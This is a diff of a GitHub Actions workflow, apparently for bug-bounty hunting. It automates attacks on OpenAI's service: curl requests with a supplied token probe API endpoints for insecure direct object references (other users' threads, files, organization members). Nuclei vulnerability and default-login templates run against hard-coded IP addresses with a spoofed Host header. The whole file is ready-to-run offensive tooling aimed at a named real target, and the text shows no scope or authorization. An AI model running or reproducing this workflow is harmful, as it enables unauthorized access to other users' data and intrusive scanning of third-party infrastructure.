@@ -1,4 +1,4 @@
-name: OpenAI Final fuck
+name: OpenAI Master Strike FIXED
 on:
   workflow_dispatch:
     inputs:
@@ -7,73 +7,47 @@ on:
         required: true
 
 jobs:
-  strike-and-poc:
+  strike:
     runs-on: ubuntu-latest
-    strategy:
-      fail-fast: false
-      matrix:
-        task: [idor-fuzz, infra-strike]
-
     steps:
-      - name: Setup Tools
-        run: |
-          go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
-          sudo apt-get install -y whois curl zip
-          echo "$HOME/go/bin" >> $GITHUB_PATH
-
-      - name: Execution Block
+      - name: Setup
         run: |
           mkdir -p poc/idor poc/infra
-          # CRITICAL FIX: Strip 'Bearer' if user included it, then add it exactly once.
-          RAW_TOKEN="${{ github.event.inputs.auth_token }}"
-          CLEAN_TOKEN=$(echo "$RAW_TOKEN" | sed 's/Bearer //g' | xargs)
+          go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
+          echo "$HOME/go/bin" >> $GITHUB_PATH
+
+      - name: IDOR & Infra Strike
+        run: |
+          CLEAN_TOKEN=$(echo "${{ github.event.inputs.auth_token }}" | sed 's/Bearer //g' | xargs)
           
-          if [[ "${{ matrix.task }}" == "idor-fuzz" ]]; then
-            echo "Starting IDOR Engine..."
-            # Testing high-value IDOR targets
-            declare -a endpoints=(
-              "https://api.openai.com/v1/organizations/org-default/users"
-              "https://api.openai.com/v1/threads/thread_test_123"
-              "https://api.openai.com/v1/files/file-test-999/content"
-              "https://api.openai.com/v1/vector_stores/vs_test"
-            )
-            for url in "${endpoints[@]}"; do
-              TIMESTAMP=$(date +%s%N)
-              echo "Testing: $url"
-              curl -v -s -H "Authorization: Bearer $CLEAN_TOKEN" \
-                   -H "OpenAI-Beta: assistants=v2" \
-                   "$url" > "poc/idor/resp_$TIMESTAMP.txt" 2>&1
-            done
-          fi
+          # 1. IDOR Tests (Direct API calls)
+          # Replace 'thread_target_abc' with any ID found in your recon
+          urls=(
+            "https://api.openai.com/v1/threads/thread_target_abc"
+            "https://api.openai.com/v1/organizations/org-default/users"
+            "https://api.openai.com/v1/files/file-test-999/content"
+          )
+          
+          for url in "${urls[@]}"; do
+            echo "Testing IDOR: $url"
+            curl -s -v -H "Authorization: Bearer $CLEAN_TOKEN" -H "OpenAI-Beta: assistants=v2" "$url" > "poc/idor/$(date +%s).txt" 2>&1
+          done
 
-          if [[ "${{ matrix.task }}" == "infra-strike" ]]; then
-            echo "Starting Infra Strike on Seoul IPs..."
-            cat <<EOF > ips.txt
-            13.125.127.14
-            43.202.58.124
-            43.202.58.199
-            43.202.58.155
-            43.202.58.133
-            EOF
-            # Nuclei for vulns + Whois for ownership proof
-            nuclei -l ips.txt -H "Host: api.openai.com" -t http/default-logins/ -t http/exposures/ -o poc/infra/nuclei_results.txt
-            while read ip; do
-              echo "--- Proof for $ip ---" >> poc/infra/ownership_evidence.txt
-              whois $ip | grep -iE "OrgName|NetName|Organization" >> poc/infra/ownership_evidence.txt
-              curl -I -s -H "Host: api.openai.com" "http://$ip" >> poc/infra/ownership_evidence.txt
-            done < ips.txt
-          fi
+          # 2. Infra Strike (The Korea Cluster)
+          echo "13.125.127.14" >> ips.txt
+          echo "43.202.58.124" >> ips.txt
+          echo "43.202.58.199" >> ips.txt
+          
+          nuclei -l ips.txt -H "Host: api.openai.com" -t http/exposures/ -o poc/infra/vulns.txt
 
-      - name: Consolidate & Pack
+      - name: Pack Evidence
         if: always()
         run: |
-          # Ensure directory isn't empty so zip doesn't crash
-          echo "Scan Metadata: $(date)" > poc/metadata.txt
-          zip -r openai_strike_poc.zip poc/
+          zip -r openai_proof.zip poc/
 
-      - name: Upload Artifact
+      - name: Upload
         uses: actions/upload-artifact@v4
         with:
-          name: POC-Evidence-${{ matrix.task }}
-          path: openai_strike_poc.zip
+          name: OpenAI-Bounty-Evidence
+          path: openai_proof.zip
           
